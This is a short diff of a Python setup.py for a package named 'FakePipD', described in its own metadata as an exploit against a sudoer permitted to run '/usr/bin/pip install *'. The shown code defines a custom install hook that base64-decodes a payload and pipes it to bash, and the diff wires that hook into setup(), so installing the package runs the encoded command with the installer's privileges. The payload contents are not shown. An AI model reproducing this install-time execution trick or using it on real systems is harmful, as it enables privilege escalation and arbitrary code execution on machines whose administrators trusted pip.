@@ -15,4 +15,12 @@ class CustomInstall(install):
     os.system('echo %s|base64 -d|bash' % encoded)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                           
+setup(name='FakePipD',
+      version='0.0.1',
+      description='This will exploit a sudoer able to /usr/bin/pip install *',
+      url='https://github.com/0x00-0x00/fakepip',
+      author='zc00l',
+      author_email='andre.marques@esecurity.com.br',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
